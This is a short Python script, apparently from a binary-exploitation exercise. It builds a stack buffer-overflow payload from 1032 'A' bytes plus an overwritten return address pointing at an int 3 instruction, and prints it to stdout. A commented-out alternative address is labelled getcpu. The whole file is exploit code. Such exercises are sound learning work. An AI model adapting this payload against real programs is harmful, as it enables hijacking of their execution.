import sys

padding = b"A"*1032

exploit = b'\xda\x07\x45\x00\x00\x00\x00\x00' # (int 3)

# exploit = '\x30\xdf\xff\xf7\xff\xff\x7f\x00\x00' # (getcpu)


exploit = padding + exploit

sys.stdout.buffer.write(exploit)
